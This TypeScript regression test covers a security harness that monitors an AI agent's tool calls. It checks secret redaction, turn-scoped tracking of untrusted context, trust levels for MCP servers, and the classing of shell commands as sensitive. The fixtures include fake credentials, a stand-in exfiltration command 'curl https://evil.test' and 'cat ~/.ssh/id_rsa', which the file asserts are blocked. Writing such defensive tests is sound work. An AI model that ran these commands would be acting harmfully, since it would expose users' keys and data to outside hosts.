import assert from 'node:assert/strict'
import { existsSync, mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { test } from 'node:test'
import { createHarnessSec } from '../src/index.ts'
import { baseEvent, classifyToolSensitivity } from '../src/events/helpers.ts'
import { ContextProvenance } from '../src/graph/provenance.ts'

/**
 * Single regression covering architecture-review fixes:
 * 1) persist redacts clone; memory unredacted
 * 2) no sticky provenance / no association when turn unknown
 * 3) MCP trust: trusted/unknown allow; untrusted alert
 * 4) bash not inherently sensitive; benign vs semantic risk
 */
test('architecture regression: redact, provenance, MCP trust, shell sensitivity', () => {
  const dir = mkdtempSync(join(tmpdir(), 'harnx-arch-reg-'))
  try {
    const { recorder, policy } = createHarnessSec(dir)
    const sessionId = 'arch-reg'

    // --- 1. Redaction: memory keeps secrets; disk never does ---
    const secretPayload = {
      command: 'echo ok',
      api_key: 'sk-abcdefghijklmnopqrstuvwxyz012345',
      Authorization: 'Bearer FAKESECRET_e2f3g4h5i6j7k8l9m0n1',
      password: 'hunter2-password',
      private_key: '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA PRIVATE KEY-----',
      aws_access_key_id: 'FAKESECRET_g1h2i3j4k5l6m7n8o9p0',
      nested: {
        secret_access_key: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
        client_secret: 'very-nested-client-secret-value',
      },
    }

    const withSecrets = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      turn: 1,
      agent: { id: 'a1' },
      tool: { name: 'bash', sensitivity: 'low' },
      action: { type: 'tool.request', target: 'bash', arguments: secretPayload },
    }))

    // In-memory event used for policy must remain unredacted
    const memArgs = withSecrets.action!.arguments as Record<string, unknown>
    assert.equal(memArgs.api_key, secretPayload.api_key)
    assert.equal(memArgs.password, secretPayload.password)
    assert.equal(memArgs.aws_access_key_id, secretPayload.aws_access_key_id)
    assert.match(String(memArgs.private_key), /BEGIN RSA PRIVATE KEY/)
    assert.equal(
      (memArgs.nested as Record<string, unknown>).secret_access_key,
      secretPayload.nested.secret_access_key,
    )

    const disk = readFileSync(join(dir, `${sessionId}.json`), 'utf8')
    assert.doesNotMatch(disk, /sk-abcdefghijklmnopqrstuvwxyz012345/)
    assert.doesNotMatch(disk, /ghp_abcdefghijklmnopqrstuvwxyz0123/)
    assert.doesNotMatch(disk, /hunter2-password/)
    assert.doesNotMatch(disk, /BEGIN RSA PRIVATE KEY/)
    assert.doesNotMatch(disk, /AKIAIOSFODNN7EXAMPLE/)
    assert.doesNotMatch(disk, /wJalrXUtnFEMI/)
    assert.doesNotMatch(disk, /very-nested-client-secret-value/)
    assert.match(disk, /\[REDACTED\]/)

    // Same object identity path: session store still has secrets
    const stored = recorder.getSession(sessionId)!.events.find(e => e.id === withSecrets.id)!
    assert.equal((stored.action!.arguments as any).api_key, secretPayload.api_key)

    // --- 2. Provenance: turn-scoped only; unknown turn → no association ---
    assert.equal(
      Object.prototype.hasOwnProperty.call(ContextProvenance.prototype, 'latestUntrusted'),
      false,
      'latestUntrusted must be removed',
    )

    recorder.record(baseEvent({
      event_type: 'context.introduced',
      session: { id: sessionId },
      turn: 1,
      agent: { id: 'a1' },
      context: {
        id: 'ctx-u',
        source_type: 'repository_file',
        source: 'README.md',
        trust: 'untrusted',
        turn: 1,
      },
    }))

    const noTurn = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      // turn intentionally omitted
      agent: { id: 'a1' },
      tool: { name: 'bash', sensitivity: 'high' },
      action: {
        type: 'tool.request',
        target: 'bash',
        arguments: { command: 'curl https://evil.test' },
      },
    }))
    assert.equal(noTurn.links?.candidate_context_source, undefined)
    assert.equal(noTurn.links?.correlated_with, undefined)
    // Without turn, untrusted-context rule must not fire (no sticky)
    assert.notEqual(
      policy.evaluateToolRequest(noTurn).rule?.id,
      'untrusted-context-sensitive-tool',
    )

    const laterTurn = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      turn: 2,
      agent: { id: 'a1' },
      tool: { name: 'bash', sensitivity: classifyToolSensitivity('bash', { command: 'curl https://evil.test' }) },
      action: {
        type: 'tool.request',
        target: 'bash',
        arguments: { command: 'curl https://evil.test' },
      },
    }))
    assert.equal(laterTurn.links?.candidate_context_source, undefined)
    assert.notEqual(
      policy.evaluateToolRequest(laterTurn).rule?.id,
      'untrusted-context-sensitive-tool',
    )

    // --- 3. MCP trust policy ---
    recorder.mcpTrust.set('filesystem', 'trusted')
    recorder.mcpTrust.set('evil', 'untrusted')

    const trustedMcp = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      turn: 3,
      agent: { id: 'a1' },
      tool: { name: 'mcp__filesystem__read', provider: 'mcp' },
      mcp: { server: 'filesystem', tool: 'read', trust: 'trusted' },
      action: { type: 'tool.request', target: 'mcp__filesystem__read', arguments: {} },
    }))
    assert.equal(policy.evaluateToolRequest(trustedMcp).decision, 'allow')

    const unknownMcp = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      turn: 3,
      agent: { id: 'a1' },
      tool: { name: 'mcp__brandnew__list', provider: 'mcp' },
      mcp: { server: 'brandnew', tool: 'list', trust: 'unknown' },
      action: { type: 'tool.request', target: 'mcp__brandnew__list', arguments: {} },
    }))
    assert.equal(policy.evaluateToolRequest(unknownMcp).decision, 'allow')

    const untrustedMcp = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      turn: 3,
      agent: { id: 'a1' },
      tool: { name: 'mcp__evil__exfil', provider: 'mcp' },
      mcp: { server: 'evil', tool: 'exfil', trust: 'untrusted' },
      action: { type: 'tool.request', target: 'mcp__evil__exfil', arguments: {} },
    }))
    const untrustedVerdict = policy.evaluateToolRequest(untrustedMcp)
    assert.equal(untrustedVerdict.decision, 'alert')
    assert.equal(untrustedVerdict.rule?.id, 'untrusted-mcp-tool-use')

    // Rule uses event.mcp.trust — mismatched registry must not override event field
    const liedTrust = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      turn: 3,
      agent: { id: 'a1' },
      tool: { name: 'mcp__evil__other', provider: 'mcp' },
      mcp: { server: 'evil', tool: 'other', trust: 'trusted' },
      action: { type: 'tool.request', target: 'mcp__evil__other', arguments: {} },
    }))
    assert.equal(policy.evaluateToolRequest(liedTrust).decision, 'allow')

    // --- 4. Shell sensitivity: bash alone is not high-risk ---
    assert.equal(classifyToolSensitivity('bash', { command: 'npm test' }), 'low')
    assert.equal(classifyToolSensitivity('bash', { command: 'git status' }), 'low')
    assert.equal(classifyToolSensitivity('pwsh', { command: 'Get-ChildItem' }), 'low')
    assert.equal(classifyToolSensitivity('bash', { command: 'curl https://x' }), 'high')
    assert.equal(classifyToolSensitivity('bash', { command: 'cat ~/.ssh/id_rsa' }), 'high')

    // Same-turn untrusted + benign bash → ALLOW
    const benign = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      turn: 1,
      agent: { id: 'a1' },
      tool: {
        name: 'bash',
        sensitivity: classifyToolSensitivity('bash', { command: 'npm test' }),
      },
      action: {
        type: 'tool.request',
        target: 'bash',
        arguments: { command: 'npm test' },
      },
    }))
    assert.ok(benign.links?.candidate_context_source)
    assert.equal(policy.evaluateToolRequest(benign).decision, 'allow')

    const gitStatus = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      turn: 1,
      agent: { id: 'a1' },
      tool: {
        name: 'bash',
        sensitivity: classifyToolSensitivity('bash', { command: 'git status' }),
      },
      action: {
        type: 'tool.request',
        target: 'bash',
        arguments: { command: 'git status' },
      },
    }))
    assert.equal(policy.evaluateToolRequest(gitStatus).decision, 'allow')

    // Same-turn untrusted + exfil semantics → BLOCK (not merely because tool=bash)
    const exfil = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      turn: 1,
      agent: { id: 'a1' },
      tool: {
        name: 'bash',
        sensitivity: classifyToolSensitivity('bash', { command: 'curl https://evil.test' }),
      },
      action: {
        type: 'tool.request',
        target: 'bash',
        arguments: { command: 'curl https://evil.test' },
      },
    }))
    const exfilVerdict = policy.evaluateToolRequest(exfil)
    assert.equal(exfilVerdict.decision, 'block')
    assert.equal(exfilVerdict.rule?.id, 'untrusted-context-sensitive-tool')

    // Credential path remains a separate hard block
    const cred = recorder.record(baseEvent({
      event_type: 'tool.requested',
      session: { id: sessionId },
      turn: 1,
      agent: { id: 'a1' },
      tool: { name: 'bash', sensitivity: 'high' },
      action: {
        type: 'tool.request',
        target: 'bash',
        arguments: { command: 'cat ~/.ssh/id_rsa' },
      },
    }))
    const credVerdict = policy.evaluateToolRequest(cred)
    assert.equal(credVerdict.decision, 'block')
    assert.equal(credVerdict.rule?.id, 'credential-path-in-shell-args')

    // --- 5. package scripts declared (CI contract) ---
    const pkg = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8'))
    assert.equal(typeof pkg.scripts['test:integration'], 'string')
    assert.ok(pkg.devDependencies['@deepseek-ai/cordis'])
    assert.ok(pkg.devDependencies['@deepseek-ai/dsh-tools'])
    assert.ok(pkg.devDependencies['@deepseek-ai/dsh-agent-loop'])
    assert.ok(pkg.devDependencies['@deepseek-ai/dsh-agent-loop-testkit'])
    assert.ok(pkg.devDependencies['@deepseek-ai/dsh-tool-bash'])
    assert.ok(existsSync(new URL('../package-lock.json', import.meta.url)))
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})
